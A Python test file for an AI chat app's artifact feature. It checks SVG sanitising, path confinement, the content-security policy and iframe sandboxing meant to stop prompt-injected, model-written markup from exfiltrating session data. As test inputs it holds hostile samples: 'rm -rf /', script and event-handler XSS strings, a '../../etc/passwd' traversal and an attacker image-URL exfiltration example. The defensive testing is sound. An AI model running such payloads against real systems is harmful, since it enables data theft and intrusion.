"""Artifacts, and the isolation they are shown behind.

An artifact is markup the *model* wrote. Inlining it into the app document
would hand model-authored script the session token, the conversation history
and every API route — a page fetched by a prompt-injected turn could read all
of it. Most of what follows is about that boundary rather than the feature.
"""
import base64
import re

import pytest

from carrot import artifacts, config


@pytest.fixture
def workspace(tmp_path, isolated_db):
    root = tmp_path / "ws"
    root.mkdir()
    config.set_config("code_workspace_dir", str(root))
    return root


PNG_1PX = base64.b64decode(
    b"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
)


class TestCreate:
    def test_stores_and_returns_an_artifact(self, isolated_db):
        a = artifacts.create("markdown", "| a | b |\n|---|---|", title="A table")
        assert a["id"] and a["kind"] == "markdown" and a["title"] == "A table"
        assert artifacts.get(a["id"])["content"].startswith("| a | b |")

    def test_unknown_kinds_are_refused(self, isolated_db):
        with pytest.raises(artifacts.ArtifactError):
            artifacts.create("executable", "rm -rf /")

    def test_empty_content_is_refused(self, isolated_db):
        with pytest.raises(artifacts.ArtifactError):
            artifacts.create("html", "   ")

    def test_oversized_content_is_refused(self, isolated_db):
        with pytest.raises(artifacts.ArtifactError):
            artifacts.create("html", "x" * (artifacts.MAX_CONTENT_BYTES + 1))

    def test_a_conversation_does_not_accumulate_forever(self, isolated_db):
        for i in range(artifacts.MAX_ARTIFACTS_PER_CONVERSATION + 12):
            artifacts.create("markdown", f"# {i}", conversation_id="c1")
        assert len(artifacts.for_conversation("c1")) <= artifacts.MAX_ARTIFACTS_PER_CONVERSATION

    def test_trimming_keeps_the_newest(self, isolated_db):
        for i in range(artifacts.MAX_ARTIFACTS_PER_CONVERSATION + 5):
            artifacts.create("markdown", f"# item {i}", conversation_id="c1")
        kept = [a["content"] for a in artifacts.for_conversation("c1")]
        assert "# item 0" not in kept
        assert f"# item {artifacts.MAX_ARTIFACTS_PER_CONVERSATION + 4}" in kept

    def test_artifacts_are_scoped_to_their_conversation(self, isolated_db):
        artifacts.create("markdown", "one", conversation_id="a")
        artifacts.create("markdown", "two", conversation_id="b")
        assert len(artifacts.for_conversation("a")) == 1

    def test_delete(self, isolated_db):
        a = artifacts.create("markdown", "gone")
        assert artifacts.delete(a["id"]) is True
        assert artifacts.get(a["id"]) is None


class TestSvgSanitising:
    """SVG is not a passive image format, and unlike HTML it is rendered
    inline rather than isolated — so it is cleaned instead."""

    def test_script_is_stripped(self):
        out = artifacts.sanitize_svg('<svg><script>fetch("/api/config")</script><rect/></svg>')
        assert "script" not in out.lower()
        assert "<rect/>" in out

    def test_event_handlers_are_stripped(self):
        out = artifacts.sanitize_svg('<svg><rect onload="steal()" onclick="x()" width="4"/></svg>')
        assert "onload" not in out.lower() and "onclick" not in out.lower()
        assert 'width="4"' in out

    def test_javascript_urls_are_stripped(self):
        out = artifacts.sanitize_svg('<svg><a xlink:href="javascript:alert(1)">x</a></svg>')
        assert "javascript:" not in out.lower()

    def test_foreign_object_is_stripped(self):
        """foreignObject smuggles arbitrary HTML into an 'image'."""
        out = artifacts.sanitize_svg(
            '<svg><foreignObject><iframe src="x"></iframe></foreignObject></svg>')
        assert "foreignobject" not in out.lower()

    def test_svg_artifacts_are_sanitised_on_the_way_in(self, isolated_db):
        a = artifacts.create("svg", '<svg><script>bad()</script><circle r="2"/></svg>')
        assert "script" not in a["content"].lower()
        assert "circle" in a["content"]


class TestImagesFromTheWorkspace:
    """A matplotlib figure arrives as a path, because run_command wrote it."""

    def test_a_workspace_png_becomes_a_data_uri(self, client, workspace, isolated_db):
        (workspace / "plot.png").write_bytes(PNG_1PX)
        a = artifacts.create("image", "", path="plot.png")
        assert a["kind"] == "image"
        assert a["content"].startswith("data:image/png;base64,")

    def test_a_path_outside_the_workspace_is_refused(self, client, workspace, isolated_db, tmp_path):
        outside = tmp_path / "secret.png"
        outside.write_bytes(PNG_1PX)
        with pytest.raises(Exception):
            artifacts.create("image", "", path="../secret.png")

    def test_a_non_image_file_is_refused(self, client, workspace, isolated_db):
        (workspace / "notes.txt").write_text("not an image")
        with pytest.raises(artifacts.ArtifactError):
            artifacts.create("image", "", path="notes.txt")

    def test_a_missing_file_is_refused(self, client, workspace, isolated_db):
        with pytest.raises(Exception):
            artifacts.create("image", "", path="never-made.png")

    def test_an_svg_file_is_sanitised_not_base64ed(self, client, workspace, isolated_db):
        (workspace / "fig.svg").write_text('<svg><script>bad()</script><rect/></svg>')
        a = artifacts.create("image", "", path="fig.svg")
        assert a["kind"] == "svg"
        assert "script" not in a["content"].lower()


class TestTheSandboxDocument:
    """What actually protects an HTML artifact."""

    def test_the_document_carries_a_csp(self, isolated_db):
        a = artifacts.create("html", "<h1>chart</h1>")
        doc = artifacts.html_document(a)
        assert "Content-Security-Policy" in doc

    def test_the_artifact_cannot_call_home(self, isolated_db):
        """The point of the CSP: even granted script, a prompt-injected page
        must not be able to send what it sees anywhere."""
        csp = artifacts.csp_header()
        assert "connect-src 'none'" in csp
        assert "form-action 'none'" in csp

    def test_no_remote_scripts_or_styles(self, isolated_db):
        csp = artifacts.csp_header()
        assert "default-src 'none'" in csp
        # Inline is allowed (charting libraries need it); remote hosts are not.
        assert "https:" not in csp and "http:" not in csp

    def test_images_are_limited_to_inline_data(self, isolated_db):
        """An <img src="https://attacker/?d=..."> is an exfiltration channel
        even with connect-src none."""
        csp = artifacts.csp_header()
        match = re.search(r"img-src ([^;]+)", csp)
        assert match and "http" not in match.group(1)

    def test_html_content_is_not_escaped_away(self, isolated_db):
        """It is isolated, not neutered — a chart has to actually render."""
        a = artifacts.create("html", "<canvas id='c'></canvas><script>draw()</script>")
        assert "<canvas" in artifacts.html_document(a)

    def test_an_image_artifact_renders_as_an_img(self, isolated_db):
        a = artifacts.create("image", "data:image/png;base64,AAAA")
        assert "<img src=\"data:image/png;base64,AAAA\"" in artifacts.html_document(a)

    def test_the_document_follows_the_theme(self, isolated_db):
        light = artifacts.create("html", "<p>x</p>", meta={"theme": "light"})
        assert "#faf6ed" in artifacts.html_document(light)


class TestApi:
    def test_fetching_returns_a_ready_to_frame_document(self, client, isolated_db):
        a = artifacts.create("html", "<h1>hi</h1>", title="Chart")
        body = client.get(f"/api/artifacts/{a['id']}").json()
        assert body["title"] == "Chart"
        assert body["document"].startswith("<!doctype html>")

    def test_missing_artifact_is_404(self, client, isolated_db):
        assert client.get("/api/artifacts/nope").status_code == 404

    def test_listing_a_conversation_omits_the_payloads(self, client, isolated_db):
        artifacts.create("html", "<h1>" + "x" * 5000 + "</h1>", conversation_id="c9")
        body = client.get("/api/conversations/c9/artifacts").json()
        assert len(body["artifacts"]) == 1
        assert "content" not in body["artifacts"][0]

    def test_creating_a_bad_kind_is_400_not_500(self, client, isolated_db):
        r = client.post("/api/artifacts", json={"kind": "wat", "content": "x"})
        assert r.status_code == 400

    def test_delete_endpoint(self, client, isolated_db):
        a = artifacts.create("markdown", "bye")
        assert client.delete(f"/api/artifacts/{a['id']}").status_code == 200
        assert client.delete(f"/api/artifacts/{a['id']}").status_code == 404


class TestTheTool:
    def test_the_tool_is_offered_to_the_model(self):
        from carrot import agent_tools

        assert "show_artifact" in agent_tools.TOOLS
        assert agent_tools.TOOLS["show_artifact"]["mutating"] is False

    def test_it_returns_a_marker_the_ui_can_find(self, isolated_db):
        from carrot import agent_tools

        result = agent_tools.TOOLS["show_artifact"]["handler"](
            kind="markdown", content="# hello", title="Greeting", conversation_id="c1")
        assert re.search(r"\[\[carrot:artifact:[a-f0-9]+\]\]", result)

    def test_the_artifact_lands_in_the_right_conversation(self, isolated_db):
        from carrot import agent_tools

        agent_tools.TOOLS["show_artifact"]["handler"](
            kind="markdown", content="# hi", conversation_id="c-target")
        assert len(artifacts.for_conversation("c-target")) == 1

    def test_a_bad_kind_returns_an_error_not_an_exception(self, isolated_db):
        """A raising tool aborts the turn; an error string lets the model
        correct itself."""
        from carrot import agent_tools

        result = agent_tools.TOOLS["show_artifact"]["handler"](
            kind="hologram", content="x", conversation_id="c1")
        assert result.startswith("error:")

    def test_a_bad_image_path_returns_an_error_not_an_exception(self, client, workspace, isolated_db):
        from carrot import agent_tools

        result = agent_tools.TOOLS["show_artifact"]["handler"](
            kind="image", path="../../etc/passwd", conversation_id="c1")
        assert result.startswith("error:")


class TestFrontendContract:
    """The marker format and the sandbox attributes are a contract between
    the tool result and the renderer; a change on one side breaks silently."""

    @property
    def js(self):
        from pathlib import Path

        root = Path(__file__).resolve().parent.parent
        return (root / "carrot" / "web" / "js" / "features.js").read_text(encoding="utf-8")

    def test_the_renderer_looks_for_the_marker_the_tool_emits(self, isolated_db):
        from carrot import agent_tools

        result = agent_tools.TOOLS["show_artifact"]["handler"](
            kind="markdown", content="# x", conversation_id="c1")
        artifact_id = re.search(r"\[\[carrot:artifact:([a-f0-9]+)\]\]", result).group(1)
        pattern = re.search(r"const ARTIFACT_MARKER = /(.+?)/g;", self.js).group(1)
        assert re.search(pattern.replace("\\\\", "\\"), f"[[carrot:artifact:{artifact_id}]]")

    def test_the_frame_never_gets_same_origin(self):
        """allow-scripts together with allow-same-origin removes the sandbox
        entirely — the frame could then reach into the app document."""
        # Comments discuss allow-same-origin at length; only code counts.
        code = "\n".join(line.split("//", 1)[0] for line in self.js.splitlines())
        assert "'allow-scripts'" in code
        assert "allow-same-origin" not in code
